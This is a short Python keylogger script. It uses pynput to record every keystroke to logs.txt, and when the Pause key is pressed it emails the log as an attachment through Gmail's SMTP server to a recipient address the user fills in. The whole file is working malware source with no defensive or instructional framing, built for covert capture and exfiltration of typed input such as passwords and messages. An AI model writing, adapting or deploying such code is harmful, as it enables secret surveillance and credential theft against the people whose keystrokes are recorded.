from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

count = 0
i = 0
keys = []
fromaddr = "" #enter email address of sender
toaddr = ""   #enter email address of the recipient
password = "" #enter email password of sender

def on_press(key):
    global keys, count,i
    keys.append(key)
    count += 1
    i += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.pause:
        try:
            msg = MIMEMultipart()
            msg['From'] = fromaddr
            msg['To'] = toaddr
            msg['Subject'] = "Keylogger"
            body = "Key logs"
            msg.attach(MIMEText(body, 'plain'))
            filename = "logs.txt"
            attachment = open("logs.txt", "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(p)
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(fromaddr, password)
            text = msg.as_string()
            s.sendmail(fromaddr, toaddr, text)
            s.quit()
            return False
        except:
            pass
        return False
    pass



def write_file(keys):
    with open("logs.txt","a+") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press,on_release) as listener:
    listener.join()
